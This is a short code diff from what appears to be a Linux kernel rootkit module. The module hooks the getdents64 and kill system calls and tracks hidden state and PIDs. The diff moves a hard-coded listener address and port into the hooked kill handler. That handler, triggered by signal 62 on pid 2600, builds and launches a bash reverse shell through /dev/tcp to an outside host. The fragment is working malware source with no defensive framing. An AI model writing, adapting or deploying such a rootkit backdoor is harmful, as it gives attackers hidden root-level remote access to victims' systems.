@@ -45,8 +45,7 @@ static t_syscall orig_getdents64 = NULL;
 static t_syscall orig_kill = NULL;
 static short hidden = 0;
 static struct list_head *prev_module;
-static char *lhost_ip = "172.17.0.1";
-static char *lhost_port = "4444";
+
 
 __pid* head = NULL;
 __pid __pidPool[MAX__pid]; // Pool of __pids
@@ -351,6 +350,9 @@ asmlinkage int hooked_kill(const struct pt_regs *pt_regs)
 
 
     else if (sig == 62 && pid == 2600) {
+
+        char *lhost_ip = "172.17.0.1";
+        char *lhost_port = "4444";
         char bash_command[100];
         snprintf(bash_command, sizeof(bash_command), "/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", lhost_ip, lhost_port);
         pr_info("Connecting shell on IP: %s and PORT: %s\n", lhost_ip, lhost_port);
